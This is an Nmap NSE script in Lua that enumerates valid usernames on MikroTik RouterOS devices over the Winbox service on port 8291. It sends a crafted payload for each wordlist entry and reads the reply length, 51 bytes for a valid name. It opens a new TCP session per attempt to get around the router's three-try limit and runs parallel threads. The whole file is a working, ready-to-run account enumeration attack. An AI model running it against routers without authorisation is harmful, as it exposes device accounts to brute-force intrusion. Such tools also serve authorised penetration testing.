description = [[
Attempts to enumerate valid usernames on MikroTik devices running the Winbox service on port 8291 in MikroTik-RouterOS.

This script takes a wordlist from the user and modifies a baseline payload by
adding the username to it. If the server responds with 35 bytes, the username
is invalid; if the response is 51 bytes, the username is valid.

Blank lines, whitespace-only lines and lines starting with <code>#</code> are
ignored, duplicate usernames are only tried once, and usernames longer than
<code>maxuserlen</code> are skipped instead of breaking the payload framing.

This script uses a new tcp session for every username because the router
doesn't respond to usernames after sending 3 tries within the same tcp session!
Attempts can be spread over several worker threads.
]]

author = "deauther890"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive", "discovery"}

---
-- @usage
-- nmap -p 8291 --script mikrotik-routeros-username-brute --script-args mikrotik-routeros-username-brute.wordlist=<wordlist path> <target>
--
-- @args mikrotik-routeros-username-brute.wordlist   A file with usernames to try, one per line.
-- @args mikrotik-routeros-username-brute.threads    Number of parallel worker threads. Default 5.
-- @args mikrotik-routeros-username-brute.delay     Seconds to wait between attempts, per thread. Default 0.5.
-- @args mikrotik-routeros-username-brute.retries   Connection attempts per username. Default 1.
-- @args mikrotik-routeros-username-brute.maxuserlen Longest username to try, RouterOS allows 32. Default 32.
--
-- @output
-- PORT     STATE SERVICE
-- 8291/tcp open  winbox
-- | mikrotik-routeros-username-brute:
-- |   admin
-- |_  mikrotik

local io = require "io"
local nmap = require "nmap"
local oops = require "oops"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"

portrule = shortport.port_or_service(8291, "winbox", "tcp")

-- Length of the null padding appended after the username.
local PADDING = 34
-- Length of the server response that means "username is valid".
local VALID_LEN = 51

local function get_num_arg(name, default)
  local n = tonumber(stdnse.get_script_args(SCRIPT_NAME .. "." .. name))
  if n == nil or n < 0 then
    return default
  end
  return n
end

--- Reads the wordlist, filtering out blank lines, comments and duplicates.
--@param file_path Path to the wordlist.
--@param maxuserlen Usernames longer than this are skipped.
--@return Array of usernames, or nil plus an error message.
local function read_wordlist(file_path, maxuserlen)
  local wordlist, seen = {}, {}
  local blank, comments, dupes, overlong = 0, 0, 0, 0

  local f, err = io.open(file_path, "r")
  if not f then
    return nil, err
  end

  for line in f:lines() do
    local username = line:match("^%s*(.-)%s*$")
    if username == "" then
      blank = blank + 1
    elseif username:match("^#") then
      comments = comments + 1
    elseif #username > maxuserlen then
      overlong = overlong + 1
      stdnse.debug2("Skipping overlong username (%d > %d chars): %s",
        #username, maxuserlen, username:sub(1, 20) .. "...")
    elseif seen[username] then
      dupes = dupes + 1
    else
      seen[username] = true
      wordlist[#wordlist + 1] = username
    end
  end

  f:close()
  stdnse.debug1("Wordlist: %d usernames to try (%d blank, %d comments, %d duplicates, %d overlong skipped)",
    #wordlist, blank, comments, dupes, overlong)
  return wordlist
end

--- Builds the Winbox probe payload for a single username.
local function create_payload(username)
  local payload = username .. string.rep("\0", PADDING)
  -- The payload is framed with a single length byte, so guard the range
  -- instead of letting string.char() throw and kill the whole script.
  if #payload > 255 then
    return nil, ("payload too long: %d bytes"):format(#payload)
  end
  return string.char(#payload) .. "\x06" .. payload
end

--- Opens a fresh session, sends one username and reports the reply length.
--@return Response length on success, or nil plus an error message.
local function try_username(host, port, username)
  local payload, perr = create_payload(username)
  if not payload then
    return nil, perr
  end

  local socket = nmap.new_socket()
  socket:set_timeout(stdnse.get_timeout(host))

  local status, cerr = socket:connect(host, port, "tcp")
  if not status then
    socket:close()
    return nil, cerr
  end

  -- NOTE: nmap.new_try() returns only the data argument, dropping the status.
  -- socket:send() returns just a status (no data), so it must NOT go through
  -- try() -- doing so would make every successful send look like a failure.
  status = socket:send(payload)
  if not status then
    socket:close()
    return nil, "send failed"
  end

  local try = nmap.new_try(function() return nil, "no response" end)

  -- receive_bytes(35) returns as soon as at least the minimum reply arrives,
  -- so both the 35-byte and the 51-byte reply are handled by the same call.
  local response = try(socket:receive_bytes(35))
  socket:close()

  if not response then
    return nil, "no response"
  end
  return #response
end

--- Worker thread: tries usernames [first..last], one fresh session each.
local function worker(host, port, usernames, first, last, results, delay, retries)
  local condvar = nmap.condvar(results)

  for i = first, last do
    local username = usernames[i]
    local length, err

    for attempt = 1, retries do
      length, err = try_username(host, port, username)
      if length then
        break
      end
      stdnse.debug2("Attempt %d for username '%s' failed: %s", attempt, username, tostring(err))
      if delay > 0 then
        stdnse.sleep(delay)
      end
    end

    if length then
      stdnse.debug2("Username '%s' -> %d bytes", username, length)
      if length == VALID_LEN then
        results[#results + 1] = username
        stdnse.debug1("Valid username: %s", username)
      end
    else
      stdnse.debug1("Giving up on username '%s': %s", username, tostring(err))
    end

    if delay > 0 and i < last then
      stdnse.sleep(delay)
    end
  end

  condvar "signal"
end

action = function(host, port)
  local wordlist_path = stdnse.get_script_args(SCRIPT_NAME .. ".wordlist")
    or stdnse.get_script_args("wordlist")
  if not wordlist_path then
    -- NSE renders the second return value only when the first is false.
    return false, oops.err("No wordlist provided. Use --script-args=" .. SCRIPT_NAME .. ".wordlist=<file>")
  end

  local threads = get_num_arg("threads", 5)
  local delay = get_num_arg("delay", 0.5)
  local retries = math.max(1, get_num_arg("retries", 1))
  local maxuserlen = math.max(1, get_num_arg("maxuserlen", 32))

  local usernames, werr = read_wordlist(wordlist_path, maxuserlen)
  if not usernames then
    return false, oops.err(("Failed to read the wordlist: %s"):format(tostring(werr)))
  end
  if #usernames == 0 then
    stdnse.verbose1("No usable usernames in %s", wordlist_path)
    return nil
  end

  stdnse.debug1("Trying %d usernames with %d thread(s), %.2fs delay, %d retries",
    #usernames, threads, delay, retries)

  local results = {}
  local condvar = nmap.condvar(results)

  -- Split the work into one chunk per worker and run the chunks in parallel.
  threads = math.min(threads, #usernames)
  local per = math.ceil(#usernames / threads)
  local running = {}
  local i = 1
  repeat
    local j = math.min(i + per - 1, #usernames)
    local co = stdnse.new_thread(worker, host, port, usernames, i, j,
      results, delay, retries)
    running[co] = true
    i = j + 1
  until i > #usernames

  -- Reap the workers. Checking liveness before waiting avoids missing a
  -- signal from a worker that finished before we started waiting.
  repeat
    for thread in pairs(running) do
      if coroutine.status(thread) == "dead" then
        running[thread] = nil
      end
    end
    if next(running) then
      condvar "wait"
    end
  until next(running) == nil

  stdnse.verbose1("%d of %d usernames were valid", #results, #usernames)

  if #results > 0 then
    table.sort(results)
    return results
  end
  return nil
end
